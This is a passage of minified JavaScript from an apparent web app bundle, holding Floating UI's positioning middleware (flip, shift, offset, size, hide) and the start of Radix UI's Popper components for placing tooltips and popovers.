                        h = It(a),
                        y = on(a) === a,
                        b = await (l.isRTL == null ? void 0 : l.isRTL(u.floating)),
                        k = m || (y || !v ? [Xi(a)] : Iw(a)),
                        C = S !== "none";
                    !m && C && k.push(...Uw(a, v, S, b));
                    const E = [a, ...k],
                        j = await hs(t, w),
                        _ = [];
                    let M = ((r = s.flip) == null ? void 0 : r.overflows) || [];
                    if ((d && _.push(j[g]), p)) {
                        const O = Ow(o, i, b);
                        _.push(j[O[0]], j[O[1]]);
                    }
                    if (((M = [...M, { placement: o, overflows: _ }]), !_.every((O) => O <= 0))) {
                        var H, D;
                        const O = (((H = s.flip) == null ? void 0 : H.index) || 0) + 1,
                            $ = E[O];
                        if (
                            $ &&
                            (!(p === "alignment" ? h !== It($) : !1) ||
                                M.every((N) => N.overflows[0] > 0 && It(N.placement) === h))
                        )
                            return { data: { index: O, overflows: M }, reset: { placement: $ } };
                        let B =
                            (D = M.filter((I) => I.overflows[0] <= 0).sort(
                                (I, N) => I.overflows[1] - N.overflows[1]
                            )[0]) == null
                                ? void 0
                                : D.placement;
                        if (!B)
                            switch (f) {
                                case "bestFit": {
                                    var G;
                                    const I =
                                        (G = M.filter((N) => {
                                            if (C) {
                                                const T = It(N.placement);
                                                return T === h || T === "y";
                                            }
                                            return !0;
                                        })
                                            .map((N) => [
                                                N.placement,
                                                N.overflows.filter((T) => T > 0).reduce((T, L) => T + L, 0),
                                            ])
                                            .sort((N, T) => N[1] - T[1])[0]) == null
                                            ? void 0
                                            : G[0];
                                    I && (B = I);
                                    break;
                                }
                                case "initialPlacement":
                                    B = a;
                                    break;
                            }
                        if (o !== B) return { reset: { placement: B } };
                    }
                    return {};
                },
            }
        );
    };
function Ap(e, t) {
    return { top: e.top - t.height, right: e.right - t.width, bottom: e.bottom - t.height, left: e.left - t.width };
}
function Mp(e) {
    return Aw.some((t) => e[t] >= 0);
}
const Ww = function (e) {
        return (
            e === void 0 && (e = {}),
            {
                name: "hide",
                options: e,
                async fn(t) {
                    const { rects: n } = t,
                        { strategy: r = "referenceHidden", ...o } = rn(e, t);
                    switch (r) {
                        case "referenceHidden": {
                            const s = await hs(t, { ...o, elementContext: "reference" }),
                                i = Ap(s, n.reference);
                            return { data: { referenceHiddenOffsets: i, referenceHidden: Mp(i) } };
                        }
                        case "escaped": {
                            const s = await hs(t, { ...o, altBoundary: !0 }),
                                i = Ap(s, n.floating);
                            return { data: { escapedOffsets: i, escaped: Mp(i) } };
                        }
                        default:
                            return {};
                    }
                },
            }
        );
    },
    xg = new Set(["left", "top"]);
async function Kw(e, t) {
    const { placement: n, platform: r, elements: o } = e,
        s = await (r.isRTL == null ? void 0 : r.isRTL(o.floating)),
        i = on(n),
        a = wo(n),
        l = It(n) === "y",
        u = xg.has(i) ? -1 : 1,
        d = s && l ? -1 : 1,
        p = rn(t, e);
    let {
        mainAxis: m,
        crossAxis: f,
        alignmentAxis: S,
    } = typeof p == "number"
        ? { mainAxis: p, crossAxis: 0, alignmentAxis: null }
        : { mainAxis: p.mainAxis || 0, crossAxis: p.crossAxis || 0, alignmentAxis: p.alignmentAxis };
    return (
        a && typeof S == "number" && (f = a === "end" ? S * -1 : S), l ? { x: f * d, y: m * u } : { x: m * u, y: f * d }
    );
}
const Qw = function (e) {
        return (
            e === void 0 && (e = 0),
            {
                name: "offset",
                options: e,
                async fn(t) {
                    var n, r;
                    const { x: o, y: s, placement: i, middlewareData: a } = t,
                        l = await Kw(t, e);
                    return i === ((n = a.offset) == null ? void 0 : n.placement) &&
                        (r = a.arrow) != null &&
                        r.alignmentOffset
                        ? {}
                        : { x: o + l.x, y: s + l.y, data: { ...l, placement: i } };
                },
            }
        );
    },
    Gw = function (e) {
        return (
            e === void 0 && (e = {}),
            {
                name: "shift",
                options: e,
                async fn(t) {
                    const { x: n, y: r, placement: o } = t,
                        {
                            mainAxis: s = !0,
                            crossAxis: i = !1,
                            limiter: a = {
                                fn: (w) => {
                                    let { x: g, y: h } = w;
                                    return { x: g, y: h };
                                },
                            },
                            ...l
                        } = rn(e, t),
                        u = { x: n, y: r },
                        d = await hs(t, l),
                        p = It(on(o)),
                        m = Ou(p);
                    let f = u[m],
                        S = u[p];
                    if (s) {
                        const w = m === "y" ? "top" : "left",
                            g = m === "y" ? "bottom" : "right",
                            h = f + d[w],
                            y = f - d[g];
                        f = kc(h, f, y);
                    }
                    if (i) {
                        const w = p === "y" ? "top" : "left",
                            g = p === "y" ? "bottom" : "right",
                            h = S + d[w],
                            y = S - d[g];
                        S = kc(h, S, y);
                    }
                    const v = a.fn({ ...t, [m]: f, [p]: S });
                    return { ...v, data: { x: v.x - n, y: v.y - r, enabled: { [m]: s, [p]: i } } };
                },
            }
        );
    },
    qw = function (e) {
        return (
            e === void 0 && (e = {}),
            {
                options: e,
                fn(t) {
                    const { x: n, y: r, placement: o, rects: s, middlewareData: i } = t,
                        { offset: a = 0, mainAxis: l = !0, crossAxis: u = !0 } = rn(e, t),
                        d = { x: n, y: r },
                        p = It(o),
                        m = Ou(p);
                    let f = d[m],
                        S = d[p];
                    const v = rn(a, t),
                        w = typeof v == "number" ? { mainAxis: v, crossAxis: 0 } : { mainAxis: 0, crossAxis: 0, ...v };
                    if (l) {
                        const y = m === "y" ? "height" : "width",
                            b = s.reference[m] - s.floating[y] + w.mainAxis,
                            k = s.reference[m] + s.reference[y] - w.mainAxis;
                        f < b ? (f = b) : f > k && (f = k);
                    }
                    if (u) {
                        var g, h;
                        const y = m === "y" ? "width" : "height",
                            b = xg.has(on(o)),
                            k =
                                s.reference[p] -
                                s.floating[y] +
                                ((b && ((g = i.offset) == null ? void 0 : g[p])) || 0) +
                                (b ? 0 : w.crossAxis),
                            C =
                                s.reference[p] +
                                s.reference[y] +
                                (b ? 0 : ((h = i.offset) == null ? void 0 : h[p]) || 0) -
                                (b ? w.crossAxis : 0);
                        S < k ? (S = k) : S > C && (S = C);
                    }
                    return { [m]: f, [p]: S };
                },
            }
        );
    },
    Xw = function (e) {
        return (
            e === void 0 && (e = {}),
            {
                name: "size",
                options: e,
                async fn(t) {
                    var n, r;
                    const { placement: o, rects: s, platform: i, elements: a } = t,
                        { apply: l = () => {}, ...u } = rn(e, t),
                        d = await hs(t, u),
                        p = on(o),
                        m = wo(o),
                        f = It(o) === "y",
                        { width: S, height: v } = s.floating;
                    let w, g;
                    p === "top" || p === "bottom"
                        ? ((w = p),
                          (g =
                              m === ((await (i.isRTL == null ? void 0 : i.isRTL(a.floating))) ? "start" : "end")
                                  ? "left"
                                  : "right"))
                        : ((g = p), (w = m === "end" ? "top" : "bottom"));
                    const h = v - d.top - d.bottom,
                        y = S - d.left - d.right,
                        b = $n(v - d[w], h),
                        k = $n(S - d[g], y),
                        C = !t.middlewareData.shift;
                    let E = b,
                        j = k;
                    if (
                        ((n = t.middlewareData.shift) != null && n.enabled.x && (j = y),
                        (r = t.middlewareData.shift) != null && r.enabled.y && (E = h),
                        C && !m)
                    ) {
                        const M = Ge(d.left, 0),
                            H = Ge(d.right, 0),
                            D = Ge(d.top, 0),
                            G = Ge(d.bottom, 0);
                        f
                            ? (j = S - 2 * (M !== 0 || H !== 0 ? M + H : Ge(d.left, d.right)))
                            : (E = v - 2 * (D !== 0 || G !== 0 ? D + G : Ge(d.top, d.bottom)));
                    }
                    await l({ ...t, availableWidth: j, availableHeight: E });
                    const _ = await i.getDimensions(a.floating);
                    return S !== _.width || v !== _.height ? { reset: { rects: !0 } } : {};
                },
            }
        );
    };
function ba() {
    return typeof window < "u";
}
function So(e) {
    return wg(e) ? (e.nodeName || "").toLowerCase() : "#document";
}
function Ye(e) {
    var t;
    return (e == null || (t = e.ownerDocument) == null ? void 0 : t.defaultView) || window;
}
function $t(e) {
    var t;
    return (t = (wg(e) ? e.ownerDocument : e.document) || window.document) == null ? void 0 : t.documentElement;
}
function wg(e) {
    return ba() ? e instanceof Node || e instanceof Ye(e).Node : !1;
}
function Pt(e) {
    return ba() ? e instanceof Element || e instanceof Ye(e).Element : !1;
}
function Ut(e) {
    return ba() ? e instanceof HTMLElement || e instanceof Ye(e).HTMLElement : !1;
}
function _p(e) {
    return !ba() || typeof ShadowRoot > "u" ? !1 : e instanceof ShadowRoot || e instanceof Ye(e).ShadowRoot;
}
const Yw = new Set(["inline", "contents"]);
function As(e) {
    const { overflow: t, overflowX: n, overflowY: r, display: o } = Tt(e);
    return /auto|scroll|overlay|hidden|clip/.test(t + r + n) && !Yw.has(o);
}
const Zw = new Set(["table", "td", "th"]);
function Jw(e) {
    return Zw.has(So(e));
}
const e2 = [":popover-open", ":modal"];
function ka(e) {
    return e2.some((t) => {
        try {
            return e.matches(t);
        } catch {
            return !1;
        }
    });
}
const t2 = ["transform", "translate", "scale", "rotate", "perspective"],
    n2 = ["transform", "translate", "scale", "rotate", "perspective", "filter"],
    r2 = ["paint", "layout", "strict", "content"];
function zu(e) {
    const t = Fu(),
        n = Pt(e) ? Tt(e) : e;
    return (
        t2.some((r) => (n[r] ? n[r] !== "none" : !1)) ||
        (n.containerType ? n.containerType !== "normal" : !1) ||
        (!t && (n.backdropFilter ? n.backdropFilter !== "none" : !1)) ||
        (!t && (n.filter ? n.filter !== "none" : !1)) ||
        n2.some((r) => (n.willChange || "").includes(r)) ||
        r2.some((r) => (n.contain || "").includes(r))
    );
}
function o2(e) {
    let t = Hn(e);
    for (; Ut(t) && !mo(t); ) {
        if (zu(t)) return t;
        if (ka(t)) return null;
        t = Hn(t);
    }
    return null;
}
function Fu() {
    return typeof CSS > "u" || !CSS.supports ? !1 : CSS.supports("-webkit-backdrop-filter", "none");
}
const s2 = new Set(["html", "body", "#document"]);
function mo(e) {
    return s2.has(So(e));
}
function Tt(e) {
    return Ye(e).getComputedStyle(e);
}
function Ca(e) {
    return Pt(e)
        ? { scrollLeft: e.scrollLeft, scrollTop: e.scrollTop }
        : { scrollLeft: e.scrollX, scrollTop: e.scrollY };
}
function Hn(e) {
    if (So(e) === "html") return e;
    const t = e.assignedSlot || e.parentNode || (_p(e) && e.host) || $t(e);
    return _p(t) ? t.host : t;
}
function Sg(e) {
    const t = Hn(e);
    return mo(t) ? (e.ownerDocument ? e.ownerDocument.body : e.body) : Ut(t) && As(t) ? t : Sg(t);
}
function gs(e, t, n) {
    var r;
    t === void 0 && (t = []), n === void 0 && (n = !0);
    const o = Sg(e),
        s = o === ((r = e.ownerDocument) == null ? void 0 : r.body),
        i = Ye(o);
    if (s) {
        const a = Ec(i);
        return t.concat(i, i.visualViewport || [], As(o) ? o : [], a && n ? gs(a) : []);
    }
    return t.concat(o, gs(o, [], n));
}
function Ec(e) {
    return e.parent && Object.getPrototypeOf(e.parent) ? e.frameElement : null;
}
function bg(e) {
    const t = Tt(e);
    let n = parseFloat(t.width) || 0,
        r = parseFloat(t.height) || 0;
    const o = Ut(e),
        s = o ? e.offsetWidth : n,
        i = o ? e.offsetHeight : r,
        a = qi(n) !== s || qi(r) !== i;
    return a && ((n = s), (r = i)), { width: n, height: r, $: a };
}
function Uu(e) {
    return Pt(e) ? e : e.contextElement;
}
function Xr(e) {
    const t = Uu(e);
    if (!Ut(t)) return Ft(1);
    const n = t.getBoundingClientRect(),
        { width: r, height: o, $: s } = bg(t);
    let i = (s ? qi(n.width) : n.width) / r,
        a = (s ? qi(n.height) : n.height) / o;
    return (!i || !Number.isFinite(i)) && (i = 1), (!a || !Number.isFinite(a)) && (a = 1), { x: i, y: a };
}
const i2 = Ft(0);
function kg(e) {
    const t = Ye(e);
    return !Fu() || !t.visualViewport ? i2 : { x: t.visualViewport.offsetLeft, y: t.visualViewport.offsetTop };
}
function a2(e, t, n) {
    return t === void 0 && (t = !1), !n || (t && n !== Ye(e)) ? !1 : t;
}
function mr(e, t, n, r) {
    t === void 0 && (t = !1), n === void 0 && (n = !1);
    const o = e.getBoundingClientRect(),
        s = Uu(e);
    let i = Ft(1);
    t && (r ? Pt(r) && (i = Xr(r)) : (i = Xr(e)));
    const a = a2(s, n, r) ? kg(s) : Ft(0);
    let l = (o.left + a.x) / i.x,
        u = (o.top + a.y) / i.y,
        d = o.width / i.x,
        p = o.height / i.y;
    if (s) {
        const m = Ye(s),
            f = r && Pt(r) ? Ye(r) : r;
        let S = m,
            v = Ec(S);
        for (; v && r && f !== S; ) {
            const w = Xr(v),
                g = v.getBoundingClientRect(),
                h = Tt(v),
                y = g.left + (v.clientLeft + parseFloat(h.paddingLeft)) * w.x,
                b = g.top + (v.clientTop + parseFloat(h.paddingTop)) * w.y;
            (l *= w.x), (u *= w.y), (d *= w.x), (p *= w.y), (l += y), (u += b), (S = Ye(v)), (v = Ec(S));
        }
    }
    return Yi({ width: d, height: p, x: l, y: u });
}
function $u(e, t) {
    const n = Ca(e).scrollLeft;
    return t ? t.left + n : mr($t(e)).left + n;
}
function Cg(e, t, n) {
    n === void 0 && (n = !1);
    const r = e.getBoundingClientRect(),
        o = r.left + t.scrollLeft - (n ? 0 : $u(e, r)),
        s = r.top + t.scrollTop;
    return { x: o, y: s };
}
function l2(e) {
    let { elements: t, rect: n, offsetParent: r, strategy: o } = e;
    const s = o === "fixed",
        i = $t(r),
        a = t ? ka(t.floating) : !1;
    if (r === i || (a && s)) return n;
    let l = { scrollLeft: 0, scrollTop: 0 },
        u = Ft(1);
    const d = Ft(0),
        p = Ut(r);
    if ((p || (!p && !s)) && ((So(r) !== "body" || As(i)) && (l = Ca(r)), Ut(r))) {
        const f = mr(r);
        (u = Xr(r)), (d.x = f.x + r.clientLeft), (d.y = f.y + r.clientTop);
    }
    const m = i && !p && !s ? Cg(i, l, !0) : Ft(0);
    return {
        width: n.width * u.x,
        height: n.height * u.y,
        x: n.x * u.x - l.scrollLeft * u.x + d.x + m.x,
        y: n.y * u.y - l.scrollTop * u.y + d.y + m.y,
    };
}
function c2(e) {
    return Array.from(e.getClientRects());
}
function u2(e) {
    const t = $t(e),
        n = Ca(e),
        r = e.ownerDocument.body,
        o = Ge(t.scrollWidth, t.clientWidth, r.scrollWidth, r.clientWidth),
        s = Ge(t.scrollHeight, t.clientHeight, r.scrollHeight, r.clientHeight);
    let i = -n.scrollLeft + $u(e);
    const a = -n.scrollTop;
    return (
        Tt(r).direction === "rtl" && (i += Ge(t.clientWidth, r.clientWidth) - o), { width: o, height: s, x: i, y: a }
    );
}
function d2(e, t) {
    const n = Ye(e),
        r = $t(e),
        o = n.visualViewport;
    let s = r.clientWidth,
        i = r.clientHeight,
        a = 0,
        l = 0;
    if (o) {
        (s = o.width), (i = o.height);
        const u = Fu();
        (!u || (u && t === "fixed")) && ((a = o.offsetLeft), (l = o.offsetTop));
    }
    return { width: s, height: i, x: a, y: l };
}
const p2 = new Set(["absolute", "fixed"]);
function f2(e, t) {
    const n = mr(e, !0, t === "fixed"),
        r = n.top + e.clientTop,
        o = n.left + e.clientLeft,
        s = Ut(e) ? Xr(e) : Ft(1),
        i = e.clientWidth * s.x,
        a = e.clientHeight * s.y,
        l = o * s.x,
        u = r * s.y;
    return { width: i, height: a, x: l, y: u };
}
function Lp(e, t, n) {
    let r;
    if (t === "viewport") r = d2(e, n);
    else if (t === "document") r = u2($t(e));
    else if (Pt(t)) r = f2(t, n);
    else {
        const o = kg(e);
        r = { x: t.x - o.x, y: t.y - o.y, width: t.width, height: t.height };
    }
    return Yi(r);
}
function Eg(e, t) {
    const n = Hn(e);
    return n === t || !Pt(n) || mo(n) ? !1 : Tt(n).position === "fixed" || Eg(n, t);
}
function m2(e, t) {
    const n = t.get(e);
    if (n) return n;
    let r = gs(e, [], !1).filter((a) => Pt(a) && So(a) !== "body"),
        o = null;
    const s = Tt(e).position === "fixed";
    let i = s ? Hn(e) : e;
    for (; Pt(i) && !mo(i); ) {
        const a = Tt(i),
            l = zu(i);
        !l && a.position === "fixed" && (o = null),
            (s ? !l && !o : (!l && a.position === "static" && !!o && p2.has(o.position)) || (As(i) && !l && Eg(e, i)))
                ? (r = r.filter((d) => d !== i))
                : (o = a),
            (i = Hn(i));
    }
    return t.set(e, r), r;
}
function h2(e) {
    let { element: t, boundary: n, rootBoundary: r, strategy: o } = e;
    const i = [...(n === "clippingAncestors" ? (ka(t) ? [] : m2(t, this._c)) : [].concat(n)), r],
        a = i[0],
        l = i.reduce(
            (u, d) => {
                const p = Lp(t, d, o);
                return (
                    (u.top = Ge(p.top, u.top)),
                    (u.right = $n(p.right, u.right)),
                    (u.bottom = $n(p.bottom, u.bottom)),
                    (u.left = Ge(p.left, u.left)),
                    u
                );
            },
            Lp(t, a, o)
        );
    return { width: l.right - l.left, height: l.bottom - l.top, x: l.left, y: l.top };
}
function g2(e) {
    const { width: t, height: n } = bg(e);
    return { width: t, height: n };
}
function y2(e, t, n) {
    const r = Ut(t),
        o = $t(t),
        s = n === "fixed",
        i = mr(e, !0, s, t);
    let a = { scrollLeft: 0, scrollTop: 0 };
    const l = Ft(0);
    function u() {
        l.x = $u(o);
    }
    if (r || (!r && !s))
        if (((So(t) !== "body" || As(o)) && (a = Ca(t)), r)) {
            const f = mr(t, !0, s, t);
            (l.x = f.x + t.clientLeft), (l.y = f.y + t.clientTop);
        } else o && u();
    s && !r && o && u();
    const d = o && !r && !s ? Cg(o, a) : Ft(0),
        p = i.left + a.scrollLeft - l.x - d.x,
        m = i.top + a.scrollTop - l.y - d.y;
    return { x: p, y: m, width: i.width, height: i.height };
}
function ml(e) {
    return Tt(e).position === "static";
}
function Op(e, t) {
    if (!Ut(e) || Tt(e).position === "fixed") return null;
    if (t) return t(e);
    let n = e.offsetParent;
    return $t(e) === n && (n = n.ownerDocument.body), n;
}
function Ng(e, t) {
    const n = Ye(e);
    if (ka(e)) return n;
    if (!Ut(e)) {
        let o = Hn(e);
        for (; o && !mo(o); ) {
            if (Pt(o) && !ml(o)) return o;
            o = Hn(o);
        }
        return n;
    }
    let r = Op(e, t);
    for (; r && Jw(r) && ml(r); ) r = Op(r, t);
    return r && mo(r) && ml(r) && !zu(r) ? n : r || o2(e) || n;
}
const v2 = async function (e) {
    const t = this.getOffsetParent || Ng,
        n = this.getDimensions,
        r = await n(e.floating);
    return {
        reference: y2(e.reference, await t(e.floating), e.strategy),
        floating: { x: 0, y: 0, width: r.width, height: r.height },
    };
};
function x2(e) {
    return Tt(e).direction === "rtl";
}
const w2 = {
    convertOffsetParentRelativeRectToViewportRelativeRect: l2,
    getDocumentElement: $t,
    getClippingRect: h2,
    getOffsetParent: Ng,
    getElementRects: v2,
    getClientRects: c2,
    getDimensions: g2,
    getScale: Xr,
    isElement: Pt,
    isRTL: x2,
};
function Pg(e, t) {
    return e.x === t.x && e.y === t.y && e.width === t.width && e.height === t.height;
}
function S2(e, t) {
    let n = null,
        r;
    const o = $t(e);
    function s() {
        var a;
        clearTimeout(r), (a = n) == null || a.disconnect(), (n = null);
    }
    function i(a, l) {
        a === void 0 && (a = !1), l === void 0 && (l = 1), s();
        const u = e.getBoundingClientRect(),
            { left: d, top: p, width: m, height: f } = u;
        if ((a || t(), !m || !f)) return;
        const S = ri(p),
            v = ri(o.clientWidth - (d + m)),
            w = ri(o.clientHeight - (p + f)),
            g = ri(d),
            y = { rootMargin: -S + "px " + -v + "px " + -w + "px " + -g + "px", threshold: Ge(0, $n(1, l)) || 1 };
        let b = !0;
        function k(C) {
            const E = C[0].intersectionRatio;
            if (E !== l) {
                if (!b) return i();
                E
                    ? i(!1, E)
                    : (r = setTimeout(() => {
                          i(!1, 1e-7);
                      }, 1e3));
            }
            E === 1 && !Pg(u, e.getBoundingClientRect()) && i(), (b = !1);
        }
        try {
            n = new IntersectionObserver(k, { ...y, root: o.ownerDocument });
        } catch {
            n = new IntersectionObserver(k, y);
        }
        n.observe(e);
    }
    return i(!0), s;
}
function b2(e, t, n, r) {
    r === void 0 && (r = {});
    const {
            ancestorScroll: o = !0,
            ancestorResize: s = !0,
            elementResize: i = typeof ResizeObserver == "function",
            layoutShift: a = typeof IntersectionObserver == "function",
            animationFrame: l = !1,
        } = r,
        u = Uu(e),
        d = o || s ? [...(u ? gs(u) : []), ...gs(t)] : [];
    d.forEach((g) => {
        o && g.addEventListener("scroll", n, { passive: !0 }), s && g.addEventListener("resize", n);
    });
    const p = u && a ? S2(u, n) : null;
    let m = -1,
        f = null;
    i &&
        ((f = new ResizeObserver((g) => {
            let [h] = g;
            h &&
                h.target === u &&
                f &&
                (f.unobserve(t),
                cancelAnimationFrame(m),
                (m = requestAnimationFrame(() => {
                    var y;
                    (y = f) == null || y.observe(t);
                }))),
                n();
        })),
        u && !l && f.observe(u),
        f.observe(t));
    let S,
        v = l ? mr(e) : null;
    l && w();
    function w() {
        const g = mr(e);
        v && !Pg(v, g) && n(), (v = g), (S = requestAnimationFrame(w));
    }
    return (
        n(),
        () => {
            var g;
            d.forEach((h) => {
                o && h.removeEventListener("scroll", n), s && h.removeEventListener("resize", n);
            }),
                p == null || p(),
                (g = f) == null || g.disconnect(),
                (f = null),
                l && cancelAnimationFrame(S);
        }
    );
}
const k2 = Qw,
    C2 = Gw,
    E2 = Vw,
    N2 = Xw,
    P2 = Ww,
    Ip = Bw,
    T2 = qw,
    j2 = (e, t, n) => {
        const r = new Map(),
            o = { platform: w2, ...n },
            s = { ...o.platform, _c: r };
        return Hw(e, t, { ...o, platform: s });
    };
var R2 = typeof document < "u",
    A2 = function () {},
    wi = R2 ? x.useLayoutEffect : A2;
function Zi(e, t) {
    if (e === t) return !0;
    if (typeof e != typeof t) return !1;
    if (typeof e == "function" && e.toString() === t.toString()) return !0;
    let n, r, o;
    if (e && t && typeof e == "object") {
        if (Array.isArray(e)) {
            if (((n = e.length), n !== t.length)) return !1;
            for (r = n; r-- !== 0; ) if (!Zi(e[r], t[r])) return !1;
            return !0;
        }
        if (((o = Object.keys(e)), (n = o.length), n !== Object.keys(t).length)) return !1;
        for (r = n; r-- !== 0; ) if (!{}.hasOwnProperty.call(t, o[r])) return !1;
        for (r = n; r-- !== 0; ) {
            const s = o[r];
            if (!(s === "_owner" && e.$$typeof) && !Zi(e[s], t[s])) return !1;
        }
        return !0;
    }
    return e !== e && t !== t;
}
function Tg(e) {
    return typeof window > "u" ? 1 : (e.ownerDocument.defaultView || window).devicePixelRatio || 1;
}
function Dp(e, t) {
    const n = Tg(e);
    return Math.round(t * n) / n;
}
function hl(e) {
    const t = x.useRef(e);
    return (
        wi(() => {
            t.current = e;
        }),
        t
    );
}
function M2(e) {
    e === void 0 && (e = {});
    const {
            placement: t = "bottom",
            strategy: n = "absolute",
            middleware: r = [],
            platform: o,
            elements: { reference: s, floating: i } = {},
            transform: a = !0,
            whileElementsMounted: l,
            open: u,
        } = e,
        [d, p] = x.useState({ x: 0, y: 0, strategy: n, placement: t, middlewareData: {}, isPositioned: !1 }),
        [m, f] = x.useState(r);
    Zi(m, r) || f(r);
    const [S, v] = x.useState(null),
        [w, g] = x.useState(null),
        h = x.useCallback((N) => {
            N !== C.current && ((C.current = N), v(N));
        }, []),
        y = x.useCallback((N) => {
            N !== E.current && ((E.current = N), g(N));
        }, []),
        b = s || S,
        k = i || w,
        C = x.useRef(null),
        E = x.useRef(null),
        j = x.useRef(d),
        _ = l != null,
        M = hl(l),
        H = hl(o),
        D = hl(u),
        G = x.useCallback(() => {
            if (!C.current || !E.current) return;
            const N = { placement: t, strategy: n, middleware: m };
            H.current && (N.platform = H.current),
                j2(C.current, E.current, N).then((T) => {
                    const L = { ...T, isPositioned: D.current !== !1 };
                    O.current &&
                        !Zi(j.current, L) &&
                        ((j.current = L),
                        Ts.flushSync(() => {
                            p(L);
                        }));
                });
        }, [m, t, n, H, D]);
    wi(() => {
        u === !1 && j.current.isPositioned && ((j.current.isPositioned = !1), p((N) => ({ ...N, isPositioned: !1 })));
    }, [u]);
    const O = x.useRef(!1);
    wi(
        () => (
            (O.current = !0),
            () => {
                O.current = !1;
            }
        ),
        []
    ),
        wi(() => {
            if ((b && (C.current = b), k && (E.current = k), b && k)) {
                if (M.current) return M.current(b, k, G);
                G();
            }
        }, [b, k, G, M, _]);
    const $ = x.useMemo(() => ({ reference: C, floating: E, setReference: h, setFloating: y }), [h, y]),
        B = x.useMemo(() => ({ reference: b, floating: k }), [b, k]),
        I = x.useMemo(() => {
            const N = { position: n, left: 0, top: 0 };
            if (!B.floating) return N;
            const T = Dp(B.floating, d.x),
                L = Dp(B.floating, d.y);
            return a
                ? {
                      ...N,
                      transform: "translate(" + T + "px, " + L + "px)",
                      ...(Tg(B.floating) >= 1.5 && { willChange: "transform" }),
                  }
                : { position: n, left: T, top: L };
        }, [n, a, B.floating, d.x, d.y]);
    return x.useMemo(() => ({ ...d, update: G, refs: $, elements: B, floatingStyles: I }), [d, G, $, B, I]);
}
const _2 = (e) => {
        function t(n) {
            return {}.hasOwnProperty.call(n, "current");
        }
        return {
            name: "arrow",
            options: e,
            fn(n) {
                const { element: r, padding: o } = typeof e == "function" ? e(n) : e;
                return r && t(r)
                    ? r.current != null
                        ? Ip({ element: r.current, padding: o }).fn(n)
                        : {}
                    : r
                      ? Ip({ element: r, padding: o }).fn(n)
                      : {};
            },
        };
    },
    L2 = (e, t) => ({ ...k2(e), options: [e, t] }),
    O2 = (e, t) => ({ ...C2(e), options: [e, t] }),
    I2 = (e, t) => ({ ...T2(e), options: [e, t] }),
    D2 = (e, t) => ({ ...E2(e), options: [e, t] }),
    z2 = (e, t) => ({ ...N2(e), options: [e, t] }),
    F2 = (e, t) => ({ ...P2(e), options: [e, t] }),
    U2 = (e, t) => ({ ..._2(e), options: [e, t] });
var $2 = "Arrow",
    jg = x.forwardRef((e, t) => {
        const { children: n, width: r = 10, height: o = 5, ...s } = e;
        return c.jsx(Ke.svg, {
            ...s,
            ref: t,
            width: r,
            height: o,
            viewBox: "0 0 30 10",
            preserveAspectRatio: "none",
            children: e.asChild ? n : c.jsx("polygon", { points: "0,0 30,0 15,10" }),
        });
    });
jg.displayName = $2;
var H2 = jg;
function B2(e) {
    const [t, n] = x.useState(void 0);
    return (
        Un(() => {
            if (e) {
                n({ width: e.offsetWidth, height: e.offsetHeight });
                const r = new ResizeObserver((o) => {
                    if (!Array.isArray(o) || !o.length) return;
                    const s = o[0];
                    let i, a;
                    if ("borderBoxSize" in s) {
                        const l = s.borderBoxSize,
                            u = Array.isArray(l) ? l[0] : l;
                        (i = u.inlineSize), (a = u.blockSize);
                    } else (i = e.offsetWidth), (a = e.offsetHeight);
                    n({ width: i, height: a });
                });
                return r.observe(e, { box: "border-box" }), () => r.unobserve(e);
            } else n(void 0);
        }, [e]),
        t
    );
}
var Rg = "Popper",
    [Ag, Mg] = va(Rg),
    [dk, _g] = Ag(Rg),
    Lg = "PopperAnchor",
    Og = x.forwardRef((e, t) => {
        const { __scopePopper: n, virtualRef: r, ...o } = e,
            s = _g(Lg, n),
            i = x.useRef(null),
            a = Nt(t, i);
        return (
            x.useEffect(() => {
                s.onAnchorChange((r == null ? void 0 : r.current) || i.current);
            }),
            r ? null : c.jsx(Ke.div, { ...o, ref: a })
        );
    });
Og.displayName = Lg;
var Hu = "PopperContent",
    [V2, W2] = Ag(Hu),
    Ig = x.forwardRef((e, t) => {
        var Z, an, ct, ut, ge, ln;
        const {
                __scopePopper: n,
                side: r = "bottom",
                sideOffset: o = 0,
                align: s = "center",
                alignOffset: i = 0,
                arrowPadding: a = 0,
                avoidCollisions: l = !0,
                collisionBoundary: u = [],
                collisionPadding: d = 0,
                sticky: p = "partial",
                hideWhenDetached: m = !1,
                updatePositionStrategy: f = "optimized",
                onPlaced: S,
                ...v
            } = e,
            w = _g(Hu, n),
            [g, h] = x.useState(null),
            y = Nt(t, (dt) => h(dt)),
            [b, k] = x.useState(null),
            C = B2(b),
            E = (C == null ? void 0 : C.width) ?? 0,
            j = (C == null ? void 0 : C.height) ?? 0,
            _ = r + (s !== "center" ? "-" + s : ""),
            M = typeof d == "number" ? d : { top: 0, right: 0, bottom: 0, left: 0, ...d },
            H = Array.isArray(u) ? u : [u],
            D = H.length > 0,
            G = { padding: M, boundary: H.filter(Q2), altBoundary: D },
            {
                refs: O,
                floatingStyles: $,
                placement: B,
                isPositioned: I,
                middlewareData: N,
            } = M2({
                strategy: "fixed",
                placement: _,
                whileElementsMounted: (...dt) => b2(...dt, { animationFrame: f === "always" }),
                elements: { reference: w.anchor },
                middleware: [
                    L2({ mainAxis: o + j, alignmentAxis: i }),
                    l && O2({ mainAxis: !0, crossAxis: !1, limiter: p === "partial" ? I2() : void 0, ...G }),
                    l && D2({ ...G }),
                    z2({
                        ...G,
                        apply: ({ elements: dt, rects: Ht, availableWidth: br, availableHeight: Co }) => {
                            const { width: kr, height: Kn } = Ht.reference,
                                jt = dt.floating.style;
                            jt.setProperty("--radix-popper-available-width", `${br}px`),
                                jt.setProperty("--radix-popper-available-height", `${Co}px`),
                                jt.setProperty("--radix-popper-anchor-width", `${kr}px`),
                                jt.setProperty("--radix-popper-anchor-height", `${Kn}px`);
                        },
                    }),
                    b && U2({ element: b, padding: a }),
                    G2({ arrowWidth: E, arrowHeight: j }),
                    m && F2({ strategy: "referenceHidden", ...G }),
                ],
            }),
            [T, L] = Fg(B),
            V = Fn(S);
        Un(() => {
            I && (V == null || V());
        }, [I, V]);
        const U = (Z = N.arrow) == null ? void 0 : Z.x,
            q = (an = N.arrow) == null ? void 0 : an.y,
            X = ((ct = N.arrow) == null ? void 0 : ct.centerOffset) !== 0,
            [ne, fe] = x.useState();
        return (
            Un(() => {
                g && fe(window.getComputedStyle(g).zIndex);
            }, [g]),
            c.jsx("div", {
                ref: O.setFloating,
                "data-radix-popper-content-wrapper": "",
                style: {
                    ...$,
                    transform: I ? $.transform : "translate(0, -200%)",
                    minWidth: "max-content",
                    zIndex: ne,
                    "--radix-popper-transform-origin": [
